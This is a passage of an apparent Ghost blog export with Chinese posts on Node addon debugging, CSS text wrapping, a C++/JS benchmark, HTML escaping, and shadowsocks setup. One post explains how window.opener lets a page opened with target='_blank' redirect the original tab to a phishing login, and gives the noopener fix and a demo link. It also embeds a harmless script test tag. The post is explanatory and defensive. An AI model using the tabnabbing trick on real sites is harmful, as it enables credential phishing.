href=\"https://github.com/nodejs/node\">nodejs</a>，这是最新的node源码。其他的版本到<a href=\"https://nodejs.org\">https://nodejs.org</a>下载。</p>\n<blockquote>\n<p>配置</p>\n</blockquote>\n<ul>\n<li>在源码根目录(我放在D:\\node-master)，打开命令行。输入<code>vcbuild.bat nosign Debug x64</code>，成功后会生成一些文件和文件夹。</li>\n<li>在工作目录打开控制台。输入node-gyp clean configure --nodedir=&quot;D:\\node-master&quot;(nodejs源码根目录)</li>\n<li>这时工作目录出现一个build文件夹，下面有个bind.sln。双击vs就打开了这个解决方案。<br>\n在打开项目的属性，如下图配置，确定。<br>\n<img src=\"/content/images/2016/08/KY-XVA--JG3KBY-OH40BC-4.png\" alt=\"\"></li>\n<li>点击调试,出现node的命令行。这里调用方法，vs中打断点就能断点调试了。<br>\n<img src=\"/content/images/2016/08/PFXE9F-7KSN-W-U-L6HE2-Q.png\" alt=\"\"></li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"56","plaintext":"> 下载\n\n\n去GitHubs下载源码nodejs [https://github.com/nodejs/node]，这是最新的node源码。其他的版本到\nhttps://nodejs.org下载。\n\n> 配置\n\n\n * 在源码根目录(我放在D:\\node-master)，打开命令行。输入vcbuild.bat nosign Debug x64\n   ，成功后会生成一些文件和文件夹。\n * 在工作目录打开控制台。输入node-gyp clean configure --nodedir=\"D:\\node-master\"(nodejs源码根目录)\n * 这时工作目录出现一个build文件夹，下面有个bind.sln。双击vs就打开了这个解决方案。\n   在打开项目的属性，如下图配置，确定。\n   \n * 点击调试,出现node的命令行。这里调用方法，vs中打断点就能断点调试了。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-08-26T10:05:20.000Z","created_by":"1","updated_at":"2016-09-02T10:38:20.000Z","updated_by":"1","published_at":"2016-08-26T10:38:27.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f6","uuid":"db68d846-5e8f-468d-b4e8-b184b302e790","title":"white-space、word-wrap和word-break区别","slug":"white-space-word-wraphe-word-breakqu-bie","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> word-wrap: normal | break-word;\\n\\n\\n\\n* normal :会换行，但是单词长度超过width时不折行，产生溢出\\n* break-word :单词超长时，会折行把剩余的单词折行显示。\\n\\n> word-break:normal | break-all | keep-all (词内换行)\\n\\n* normal:如果是中文则到边界处的汉字换行,如果是英文整个词换行,注意:如果出现某个英文字符串长度超过边界,则后面的部分将撑开边框,如果边框为固定属性,则后面部分将无法显示.\\n* break-all :强行换行,将截断英文单词\\n* keep-all :不允许字断开。如果是中文将把前后标点符号内的一个汉字短语整个换行,英文单词也整个换行,注意:如果出现某个英文.字符串长度超过边界,则后面的部分将撑开边框,如果边框为固定属性,则后面部分将无法显示.\\n\\n> white-space（优先级最高）\\n\\n* inherit :指其值继承父元素对应属性的计算值。\\n* initial :指其值为原始的值。\\n* normal　：默认，浏览器忽略空白符\\n* nowrap　：文本不会换行，文本会在在同一行上继续，直到遇到 <br> 标签为止。\\n* pre-line：合并空白符，但是保留换行符。\\n* pre-wrap：保留空白符，但是正常地进行换行。\\n\\n> text-overflow ： clip | ellipsis\\n\\n* clip:而只是简单的裁切，需要在一定的高度范围内配合overflow:hidden属性使用．\\n* ellipsis：对象文本溢出时将显示省略标记(...)，需要配合overflow:hidden；white-space:nowrap起使用才会有效果。\\n\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>word-wrap: normal | break-word;</p>\n</blockquote>\n<ul>\n<li>normal :会换行，但是单词长度超过width时不折行，产生溢出</li>\n<li>break-word :单词超长时，会折行把剩余的单词折行显示。</li>\n</ul>\n<blockquote>\n<p>word-break:normal | break-all | keep-all (词内换行)</p>\n</blockquote>\n<ul>\n<li>normal:如果是中文则到边界处的汉字换行,如果是英文整个词换行,注意:如果出现某个英文字符串长度超过边界,则后面的部分将撑开边框,如果边框为固定属性,则后面部分将无法显示.</li>\n<li>break-all :强行换行,将截断英文单词</li>\n<li>keep-all :不允许字断开。如果是中文将把前后标点符号内的一个汉字短语整个换行,英文单词也整个换行,注意:如果出现某个英文.字符串长度超过边界,则后面的部分将撑开边框,如果边框为固定属性,则后面部分将无法显示.</li>\n</ul>\n<blockquote>\n<p>white-space（优先级最高）</p>\n</blockquote>\n<ul>\n<li>inherit :指其值继承父元素对应属性的计算值。</li>\n<li>initial :指其值为原始的值。</li>\n<li>normal　：默认，浏览器忽略空白符</li>\n<li>nowrap　：文本不会换行，文本会在在同一行上继续，直到遇到 <br> 标签为止。</li>\n<li>pre-line：合并空白符，但是保留换行符。</li>\n<li>pre-wrap：保留空白符，但是正常地进行换行。</li>\n</ul>\n<blockquote>\n<p>text-overflow ： clip | ellipsis</p>\n</blockquote>\n<ul>\n<li>clip:而只是简单的裁切，需要在一定的高度范围内配合overflow:hidden属性使用．</li>\n<li>ellipsis：对象文本溢出时将显示省略标记(...)，需要配合overflow:hidden；white-space:nowrap起使用才会有效果。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"57","plaintext":"> word-wrap: normal | break-word;\n\n\n * normal :会换行，但是单词长度超过width时不折行，产生溢出\n * break-word :单词超长时，会折行把剩余的单词折行显示。\n\n> word-break:normal | break-all | keep-all (词内换行)\n\n\n * normal:如果是中文则到边界处的汉字换行,如果是英文整个词换行,注意:如果出现某个英文字符串长度超过边界,则后面的部分将撑开边框,如果边框为固定属性,则后面部分将无法显示.\n * break-all :强行换行,将截断英文单词\n * keep-all\n   :不允许字断开。如果是中文将把前后标点符号内的一个汉字短语整个换行,英文单词也整个换行,注意:如果出现某个英文.字符串长度超过边界,则后面的部分将撑开边框,如果边框为固定属性,则后面部分将无法显示.\n\n> white-space（优先级最高）\n\n\n * inherit :指其值继承父元素对应属性的计算值。\n * initial :指其值为原始的值。\n * normal　：默认，浏览器忽略空白符\n * nowrap　：文本不会换行，文本会在在同一行上继续，直到遇到 \n   标签为止。\n * pre-line：合并空白符，但是保留换行符。\n * pre-wrap：保留空白符，但是正常地进行换行。\n\n> text-overflow ： clip | ellipsis\n\n\n * clip:而只是简单的裁切，需要在一定的高度范围内配合overflow:hidden属性使用．\n * ellipsis：对象文本溢出时将显示省略标记(...)，需要配合overflow:hidden；white-space:nowrap起使用才会有效果。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-08-29T03:14:08.000Z","created_by":"1","updated_at":"2016-09-05T03:26:33.000Z","updated_by":"1","published_at":"2016-08-29T03:34:25.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f7","uuid":"e6e0b137-391f-4b80-bf5d-cce374c0eacc","title":"不安全的target=\"_blank\"","slug":"window-opener","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 原理\\n\\n   点击有target=\\\"_blank\\\"属性的超链接后，浏览器会单独新建一个标签页来显示该链接所指向的内容。但是请注意，在这一瞬间，浏览器会允许新建的标签页通过一个名为“window.opener”的浏览器API来与之前的网页进行短暂通信。这时候，在新的标签页执行了window.opener.location.href=\\\"xxx\\\"。原标签页就会跳转到xxx。\\n\\n> 如下\\n\\n<a href=\\\"http://www.dadigua.win:8080/qc.html\\\" target=\\\"_blank\\\">qc</a>\\n\\n> 利用\\n\\n可以把原来的网页，跳转到钓鱼网页，提示，登录过期，请重新登录。用户很容易就泄漏了自己的密码。\\n\\n> 修复问题\\n\\n这也就意味着，修复该问题的重担将落在网站管理员的身上了。实际上，修复该问题最简单的方法就是在网站所有的链接中加入rel=”noopener”属性。对于火狐浏览器而言，由于它并不完全支持该属性，所以开发人员应该使用rel=”noopenernoreferrer”属性作为代替。\\n\\n请记住，当你每次使用window.open()接口来打开一个新的网页窗口时，你的安全性很有可能会受到这一API的影响，所以别忘了重置“opener”属性。\\n```\\nvar newWnd = window.open();\\nnewWnd.opener = null;\\n```\\n\\n> 原文\\n\\n[链接地址中的target=”_blank”属性，为钓鱼攻击打开了大门](http://www.freebuf.com/vuls/113634.html)\\n\\n<script>console.log(1)</script>\\n\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>原理</p>\n</blockquote>\n<p>点击有target=&quot;_blank&quot;属性的超链接后，浏览器会单独新建一个标签页来显示该链接所指向的内容。但是请注意，在这一瞬间，浏览器会允许新建的标签页通过一个名为“window.opener”的浏览器API来与之前的网页进行短暂通信。这时候，在新的标签页执行了window.opener.location.href=&quot;xxx&quot;。原标签页就会跳转到xxx。</p>\n<blockquote>\n<p>如下</p>\n</blockquote>\n<p><a href=\"http://www.dadigua.win:8080/qc.html\" target=\"_blank\">qc</a></p>\n<blockquote>\n<p>利用</p>\n</blockquote>\n<p>可以把原来的网页，跳转到钓鱼网页，提示，登录过期，请重新登录。用户很容易就泄漏了自己的密码。</p>\n<blockquote>\n<p>修复问题</p>\n</blockquote>\n<p>这也就意味着，修复该问题的重担将落在网站管理员的身上了。实际上，修复该问题最简单的方法就是在网站所有的链接中加入rel=”noopener”属性。对于火狐浏览器而言，由于它并不完全支持该属性，所以开发人员应该使用rel=”noopenernoreferrer”属性作为代替。</p>\n<p>请记住，当你每次使用window.open()接口来打开一个新的网页窗口时，你的安全性很有可能会受到这一API的影响，所以别忘了重置“opener”属性。</p>\n<pre><code>var newWnd = window.open();\nnewWnd.opener = null;\n</code></pre>\n<blockquote>\n<p>原文</p>\n</blockquote>\n<p><a href=\"http://www.freebuf.com/vuls/113634.html\">链接地址中的target=”_blank”属性，为钓鱼攻击打开了大门</a></p>\n<script>console.log(1)</script>\n<!--kg-card-end: markdown-->","comment_id":"58","plaintext":"> 原理\n\n\n点击有target=\"_blank\"属性的超链接后，浏览器会单独新建一个标签页来显示该链接所指向的内容。但是请注意，在这一瞬间，浏览器会允许新建的标签页通过一个名为“window.opener”的浏览器API来与之前的网页进行短暂通信。这时候，在新的标签页执行了window.opener.location.href=\"xxx\"。原标签页就会跳转到xxx。\n\n> 如下\n\n\nqc [http://www.dadigua.win:8080/qc.html]\n\n> 利用\n\n\n可以把原来的网页，跳转到钓鱼网页，提示，登录过期，请重新登录。用户很容易就泄漏了自己的密码。\n\n> 修复问题\n\n\n这也就意味着，修复该问题的重担将落在网站管理员的身上了。实际上，修复该问题最简单的方法就是在网站所有的链接中加入rel=”noopener”属性。对于火狐浏览器而言，由于它并不完全支持该属性，所以开发人员应该使用rel=”noopenernoreferrer”属性作为代替。\n\n请记住，当你每次使用window.open()接口来打开一个新的网页窗口时，你的安全性很有可能会受到这一API的影响，所以别忘了重置“opener”属性。\n\nvar newWnd = window.open();\nnewWnd.opener = null;\n\n\n> 原文\n\n\n链接地址中的target=”_blank”属性，为钓鱼攻击打开了大门 [http://www.freebuf.com/vuls/113634.html]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-09-05T03:17:30.000Z","created_by":"1","updated_at":"2016-09-14T02:07:55.000Z","updated_by":"1","published_at":"2016-09-05T03:28:50.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f8","uuid":"fa0848fc-6dc6-4f5a-85b7-baafbb9fda76","title":"generate-parentheses--LeetCode","slug":"submission-details-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"试下node的C/C++ Addons的性能。\\n题目见[generate-parentheses](https://leetcode.com/problems/generate-parentheses/)\\n\\n> js\\n```\\n\\t\\\"use strict\\\";\\n        console.time();\\t\\n\\tvar generateParenthesis = function(n) {\\n\\tvar arr=[];\\n\\tfunction run(left,right,str){\\n\\t\\tif(left>0){\\n\\t\\t\\trun(left-1,right,str+\\\"(\\\");\\n\\t\\t}\\n\\t\\tif(right>0&&left<right){\\n\\t\\t\\trun(left,right-1,str+\\\")\\\");\\n\\t\\t}\\n\\t\\tif(left===0&&right===0){\\n\\t\\t\\tarr.push(str);\\n\\t\\t}\\n\\t\\t\\n\\t}\\n\\trun(n-1,n,\\\"(\\\");\\n\\treturn arr;\\n\\t};\\n\\tconsole.log(generateParenthesis(15).length)\\n\\tconsole.timeEnd();\\n```\\n> node C/C++ Addons\\n```\\n#ifdef WIN32\\n#pragma execution_character_set(\\\"utf-8\\\") //配合v8使用。\\n#endif\\n#include<iostream>\\n#include <node.h>\\n#include <vector>\\n\\nnamespace demo {\\n\\t//using namespace std;\\n\\tusing v8::Exception;\\n\\tusing v8::FunctionCallbackInfo;\\n\\tusing v8::Isolate;\\n\\tusing v8::Local;\\n\\tusing v8::Number;\\n\\tusing v8::Array;\\n\\tusing v8::Object;\\n\\tusing v8::String;\\n\\tusing v8::Value;\\n\\t\\n\\tclass Solution {\\n\\tpublic:\\n\\t\\tinline void run(int left, int right, std::string &str, std::vector<std::string> &arr) {\\n\\t\\t\\tif (left>0) {\\n\\t\\t\\t\\tstr.push_back('(');\\n\\t\\t\\t\\trun(left - 1, right, str, arr);\\n\\t\\t\\t\\tstr.pop_back();\\n\\t\\t\\t}\\n\\t\\t\\tif (right>0 && left<right) {\\n\\t\\t\\t\\tstr.push_back(')');\\n\\t\\t\\t\\trun(left, right - 1, str, arr);\\n\\t\\t\\t\\tstr.pop_back();\\n\\t\\t\\t}\\n\\t\\t\\tif (left == 0 && right == 0) {\\n\\t\\t\\t\\tarr.push_back(str);\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tstd::vector<std::string> generateParenthesis(int n) {\\n\\t\\t\\tstd::vector<std::string> arr;\\n\\t\\t\\tarr.reserve(10000000);\\n\\t\\t\\tstd::string str = \\\"(\\\";\\n\\t\\t\\trun(n - 1, n, str, arr);\\n\\t\\t\\treturn arr;\\n\\t\\t}\\n\\t};\\n\\tvoid Method(const FunctionCallbackInfo<Value>& args) {\\n\\t\\tIsolate* isolate = args.GetIsolate();\\n\\t\\tstd::vector<std::string> arr;\\n\\t\\tint n = (int)args[0]->NumberValue();\\n\\t\\tSolution s;\\n\\t\\tarr= s.generateParenthesis(n);\\n\\t\\tLocal<v8::Array> v8arr=\\tArray::New(isolate,arr.size());\\n\\t\\t//args.GetReturnValue().Set(v8arr);\\n\\t\\tfor (size_t i = 0; i < arr.size(); i++)\\n\\t\\t{\\n\\t\\t\\tv8arr->Set(i, v8::String::NewFromUtf8(isolate, arr[i].c_str()));\\n\\t\\t}\\n\\t\\targs.GetReturnValue().Set(v8arr);\\n\\t}\\n\\n\\tvoid init(Local<Object> exports) {\\n\\t\\tNODE_SET_METHOD(exports, \\\"hello\\\", Method);\\n\\t}\\n\\n\\tNODE_MODULE(addon, init)\\n\\n} \\n```\\n> 结果\\n\\n在输出n等于15时候，返回900W+条，字符串。这里一比发现，js主要4秒左右。C/C++ Addons要15秒。原来在\\n在把C++的vector<string>对象转成js的Array时，耗了大量的时间。C++得到900W+条vector<string>时，其实只花了2s+的时间。\\n\\n> 注意\\n\\n传引用，传值，性能差距还是蛮大的，这里C++代码string str传值，会比js慢。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>试下node的C/C++ Addons的性能。<br>\n题目见<a href=\"https://leetcode.com/problems/generate-parentheses/\">generate-parentheses</a></p>\n<blockquote>\n<p>js</p>\n</blockquote>\n<pre><code>\t&quot;use strict&quot;;\n        console.time();\t\n\tvar generateParenthesis = function(n) {\n\tvar arr=[];\n\tfunction run(left,right,str){\n\t\tif(left&gt;0){\n\t\t\trun(left-1,right,str+&quot;(&quot;);\n\t\t}\n\t\tif(right&gt;0&amp;&amp;left&lt;right){\n\t\t\trun(left,right-1,str+&quot;)&quot;);\n\t\t}\n\t\tif(left===0&amp;&amp;right===0){\n\t\t\tarr.push(str);\n\t\t}\n\t\t\n\t}\n\trun(n-1,n,&quot;(&quot;);\n\treturn arr;\n\t};\n\tconsole.log(generateParenthesis(15).length)\n\tconsole.timeEnd();\n</code></pre>\n<blockquote>\n<p>node C/C++ Addons</p>\n</blockquote>\n<pre><code>#ifdef WIN32\n#pragma execution_character_set(&quot;utf-8&quot;) //配合v8使用。\n#endif\n#include&lt;iostream&gt;\n#include &lt;node.h&gt;\n#include &lt;vector&gt;\n\nnamespace demo {\n\t//using namespace std;\n\tusing v8::Exception;\n\tusing v8::FunctionCallbackInfo;\n\tusing v8::Isolate;\n\tusing v8::Local;\n\tusing v8::Number;\n\tusing v8::Array;\n\tusing v8::Object;\n\tusing v8::String;\n\tusing v8::Value;\n\t\n\tclass Solution {\n\tpublic:\n\t\tinline void run(int left, int right, std::string &amp;str, std::vector&lt;std::string&gt; &amp;arr) {\n\t\t\tif (left&gt;0) {\n\t\t\t\tstr.push_back('(');\n\t\t\t\trun(left - 1, right, str, arr);\n\t\t\t\tstr.pop_back();\n\t\t\t}\n\t\t\tif (right&gt;0 &amp;&amp; left&lt;right) {\n\t\t\t\tstr.push_back(')');\n\t\t\t\trun(left, right - 1, str, arr);\n\t\t\t\tstr.pop_back();\n\t\t\t}\n\t\t\tif (left == 0 &amp;&amp; right == 0) {\n\t\t\t\tarr.push_back(str);\n\t\t\t}\n\t\t}\n\t\tstd::vector&lt;std::string&gt; generateParenthesis(int n) {\n\t\t\tstd::vector&lt;std::string&gt; arr;\n\t\t\tarr.reserve(10000000);\n\t\t\tstd::string str = &quot;(&quot;;\n\t\t\trun(n - 1, n, str, arr);\n\t\t\treturn arr;\n\t\t}\n\t};\n\tvoid Method(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {\n\t\tIsolate* isolate = args.GetIsolate();\n\t\tstd::vector&lt;std::string&gt; arr;\n\t\tint n = (int)args[0]-&gt;NumberValue();\n\t\tSolution s;\n\t\tarr= s.generateParenthesis(n);\n\t\tLocal&lt;v8::Array&gt; v8arr=\tArray::New(isolate,arr.size());\n\t\t//args.GetReturnValue().Set(v8arr);\n\t\tfor (size_t i = 0; i &lt; arr.size(); i++)\n\t\t{\n\t\t\tv8arr-&gt;Set(i, v8::String::NewFromUtf8(isolate, arr[i].c_str()));\n\t\t}\n\t\targs.GetReturnValue().Set(v8arr);\n\t}\n\n\tvoid init(Local&lt;Object&gt; exports) {\n\t\tNODE_SET_METHOD(exports, &quot;hello&quot;, Method);\n\t}\n\n\tNODE_MODULE(addon, init)\n\n} \n</code></pre>\n<blockquote>\n<p>结果</p>\n</blockquote>\n<p>在输出n等于15时候，返回900W+条，字符串。这里一比发现，js主要4秒左右。C/C++ Addons要15秒。原来在<br>\n在把C++的vector<string>对象转成js的Array时，耗了大量的时间。C++得到900W+条vector<string>时，其实只花了2s+的时间。</p>\n<blockquote>\n<p>注意</p>\n</blockquote>\n<p>传引用，传值，性能差距还是蛮大的，这里C++代码string str传值，会比js慢。</p>\n<!--kg-card-end: markdown-->","comment_id":"59","plaintext":"试下node的C/C++ Addons的性能。\n题目见generate-parentheses [https://leetcode.com/problems/generate-parentheses/]\n\n> js\n\n\n\t\"use strict\";\n        console.time();\t\n\tvar generateParenthesis = function(n) {\n\tvar arr=[];\n\tfunction run(left,right,str){\n\t\tif(left>0){\n\t\t\trun(left-1,right,str+\"(\");\n\t\t}\n\t\tif(right>0&&left<right){\n\t\t\trun(left,right-1,str+\")\");\n\t\t}\n\t\tif(left===0&&right===0){\n\t\t\tarr.push(str);\n\t\t}\n\t\t\n\t}\n\trun(n-1,n,\"(\");\n\treturn arr;\n\t};\n\tconsole.log(generateParenthesis(15).length)\n\tconsole.timeEnd();\n\n\n> node C/C++ Addons\n\n\n#ifdef WIN32\n#pragma execution_character_set(\"utf-8\") //配合v8使用。\n#endif\n#include<iostream>\n#include <node.h>\n#include <vector>\n\nnamespace demo {\n\t//using namespace std;\n\tusing v8::Exception;\n\tusing v8::FunctionCallbackInfo;\n\tusing v8::Isolate;\n\tusing v8::Local;\n\tusing v8::Number;\n\tusing v8::Array;\n\tusing v8::Object;\n\tusing v8::String;\n\tusing v8::Value;\n\t\n\tclass Solution {\n\tpublic:\n\t\tinline void run(int left, int right, std::string &str, std::vector<std::string> &arr) {\n\t\t\tif (left>0) {\n\t\t\t\tstr.push_back('(');\n\t\t\t\trun(left - 1, right, str, arr);\n\t\t\t\tstr.pop_back();\n\t\t\t}\n\t\t\tif (right>0 && left<right) {\n\t\t\t\tstr.push_back(')');\n\t\t\t\trun(left, right - 1, str, arr);\n\t\t\t\tstr.pop_back();\n\t\t\t}\n\t\t\tif (left == 0 && right == 0) {\n\t\t\t\tarr.push_back(str);\n\t\t\t}\n\t\t}\n\t\tstd::vector<std::string> generateParenthesis(int n) {\n\t\t\tstd::vector<std::string> arr;\n\t\t\tarr.reserve(10000000);\n\t\t\tstd::string str = \"(\";\n\t\t\trun(n - 1, n, str, arr);\n\t\t\treturn arr;\n\t\t}\n\t};\n\tvoid Method(const FunctionCallbackInfo<Value>& args) {\n\t\tIsolate* isolate = args.GetIsolate();\n\t\tstd::vector<std::string> arr;\n\t\tint n = (int)args[0]->NumberValue();\n\t\tSolution s;\n\t\tarr= s.generateParenthesis(n);\n\t\tLocal<v8::Array> v8arr=\tArray::New(isolate,arr.size());\n\t\t//args.GetReturnValue().Set(v8arr);\n\t\tfor (size_t i = 0; i < arr.size(); i++)\n\t\t{\n\t\t\tv8arr->Set(i, v8::String::NewFromUtf8(isolate, arr[i].c_str()));\n\t\t}\n\t\targs.GetReturnValue().Set(v8arr);\n\t}\n\n\tvoid init(Local<Object> exports) {\n\t\tNODE_SET_METHOD(exports, \"hello\", Method);\n\t}\n\n\tNODE_MODULE(addon, init)\n\n} \n\n\n> 结果\n\n\n在输出n等于15时候，返回900W+条，字符串。这里一比发现，js主要4秒左右。C/C++ Addons要15秒。原来在\n在把C++的vector对象转成js的Array时，耗了大量的时间。C++得到900W+条vector时，其实只花了2s+的时间。\n\n> 注意\n\n\n传引用，传值，性能差距还是蛮大的，这里C++代码string str传值，会比js慢。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-09-07T10:21:33.000Z","created_by":"1","updated_at":"2016-09-27T10:40:05.000Z","updated_by":"1","published_at":"2016-09-07T10:37:04.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2f9","uuid":"72803394-2612-4ebb-8b1a-a9c3c0e8187c","title":"xss字符串替换","slug":"xsszi-fu-chuan-ti-huan","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\" function xssCheck(str,reg){\\n    return str ? str.replace(reg ||/[&<\\\">]/g,function (a, b) {\\n        return {\\n          '<':'&lt;',\\n          '&':'&amp;',\\n          '\\\"':'&quot;',\\n          '>':'&gt;'\\n        }[a]\\n    }): '';\\n  }\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>function xssCheck(str,reg){<br>\nreturn str ? str.replace(reg ||/[&amp;&lt;&quot;&gt;]/g,function (a, b) {<br>\nreturn {<br>\n'&lt;':'&lt;',<br>\n'&amp;':'&amp;',<br>\n'&quot;':'&quot;',<br>\n'&gt;':'&gt;'<br>\n}[a]<br>\n}): '';<br>\n}</p>\n<!--kg-card-end: markdown-->","comment_id":"60","plaintext":"function xssCheck(str,reg){\nreturn str ? str.replace(reg ||/[&<\">]/g,function (a, b) {\nreturn {\n'<':'<',\n'&':'&',\n'\"':'\"',\n'>':'>'\n}[a]\n}): '';\n}","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-09-18T10:36:35.000Z","created_by":"1","updated_at":"2016-09-27T10:31:01.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2fa","uuid":"f677d2ca-0dd7-44a3-80c8-24904f815ef4","title":"SyntaxHighlighter测试 ghost","slug":"syntaxhighlighter","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"ghost博客使用SyntaxHighlighter时写一些c++的代码时。在引入头文件是要加入`<>`符号。但是ghost会吧`<>`当成标签转义。所以应该用`&lt;&gt;`代替`<>`,如`#include <string.h>`改成`#include &lt;string.h&gt;`最后，就能完美显示了。\\n<pre class=\\\"brush:cpp;\\\" >\\n#include \\\"stdafx.h\\\"\\n#include <tesseract\\\\baseapi.h>\\n#include <leptonica\\\\allheaders.h>\\n#include <iostream>\\n#include <string.h>\\n\\nusing namespace std;\\n\\nint main(void) {\\n\\n\\tconst char * image = \\\"2.png\\\";\\n\\n\\ttesseract::TessBaseAPI  api;\\n\\n//\\tapi.Init(\\\"D:\\\\\\\\tesseract\\\\\\\\tessdata\\\", \\\"chi_sim\\\", tesseract::OEM_DEFAULT);\\n\\tapi.Init(\\\"D:\\\\\\\\tesseract\\\\\\\\tessdata\\\", \\\"eng\\\", tesseract::OEM_DEFAULT);\\n\\tapi.SetVariable(\\\"tessedit_char_whitelist\\\", \\\"0123456789.\\\");\\n\\n\\tSTRING text_out;\\n\\tif (!api.ProcessPages(image, NULL, 0, &text_out))\\n\\t{\\n\\t\\tsystem(\\\"pause\\\");\\n\\t\\treturn 0;\\n\\t}\\n\\tprintf(text_out.string());\\n\\tsystem(\\\"pause\\\");\\n}\\n</pre>\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>ghost博客使用SyntaxHighlighter时写一些c++的代码时。在引入头文件是要加入<code>&lt;&gt;</code>符号。但是ghost会吧<code>&lt;&gt;</code>当成标签转义。所以应该用<code>&amp;lt;&amp;gt;</code>代替<code>&lt;&gt;</code>,如<code>#include &lt;string.h&gt;</code>改成<code>#include &amp;lt;string.h&amp;gt;</code>最后，就能完美显示了。</p>\n<pre class=\"brush:cpp;\" >\n#include \"stdafx.h\"\n#include <tesseract\\baseapi.h>\n#include <leptonica\\allheaders.h>\n#include <iostream>\n#include <string.h>\n\nusing namespace std;\n\nint main(void) {\n\n\tconst char * image = \"2.png\";\n\n\ttesseract::TessBaseAPI  api;\n\n//\tapi.Init(\"D:\\\\tesseract\\\\tessdata\", \"chi_sim\", tesseract::OEM_DEFAULT);\n\tapi.Init(\"D:\\\\tesseract\\\\tessdata\", \"eng\", tesseract::OEM_DEFAULT);\n\tapi.SetVariable(\"tessedit_char_whitelist\", \"0123456789.\");\n\n\tSTRING text_out;\n\tif (!api.ProcessPages(image, NULL, 0, &text_out))\n\t{\n\t\tsystem(\"pause\");\n\t\treturn 0;\n\t}\n\tprintf(text_out.string());\n\tsystem(\"pause\");\n}\n</pre>\n<!--kg-card-end: markdown-->","comment_id":"61","plaintext":"ghost博客使用SyntaxHighlighter时写一些c++的代码时。在引入头文件是要加入<>符号。但是ghost会吧<>当成标签转义。所以应该用\n&lt;&gt;代替<>,如#include <string.h>改成#include &lt;string.h&gt;最后，就能完美显示了。\n\n\n#include \"stdafx.h\"\n#include \n#include \n#include \n#include \n\nusing namespace std;\n\nint main(void) {\n\n\tconst char * image = \"2.png\";\n\n\ttesseract::TessBaseAPI  api;\n\n//\tapi.Init(\"D:\\\\tesseract\\\\tessdata\", \"chi_sim\", tesseract::OEM_DEFAULT);\n\tapi.Init(\"D:\\\\tesseract\\\\tessdata\", \"eng\", tesseract::OEM_DEFAULT);\n\tapi.SetVariable(\"tessedit_char_whitelist\", \"0123456789.\");\n\n\tSTRING text_out;\n\tif (!api.ProcessPages(image, NULL, 0, &text_out))\n\t{\n\t\tsystem(\"pause\");\n\t\treturn 0;\n\t}\n\tprintf(text_out.string());\n\tsystem(\"pause\");\n}","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-09-27T10:39:34.000Z","created_by":"1","updated_at":"2016-10-17T02:56:55.000Z","updated_by":"1","published_at":"2016-09-27T10:40:31.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2fb","uuid":"23597dc5-6b77-4c0c-ab5d-9d7b00aae50e","title":"linux部署shadowsocks","slug":"linux","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"* 检查服务器下Python 版本，要有2.6 or 2.7。我用的ubuntu12，自带的就是2.7。\\n```\\npython --version  \\nPython 2.7.3  \\n```\\n* 然后安装pip，python的软件包管理(这个好比node的npm)。python-gevent这个最好也要加上。\\n\\n`apt-get install python-gevent python-pip`\\n\\n* 下一步用pip安装shadowsocks\\n\\n`pip install shadowsocks`\\n\\n* 然后在任意位置新建一个json文件，如xxx.json编辑如下内容，保存。\\n```\\n{\\n    \\\"server\\\":\\\"server_ip\\\",\\n    \\\"server_port\\\":23456,\\n    \\\"local_address\\\": \\\"127.0.0.1\\\",\\n    \\\"local_port\\\":3333,\\n    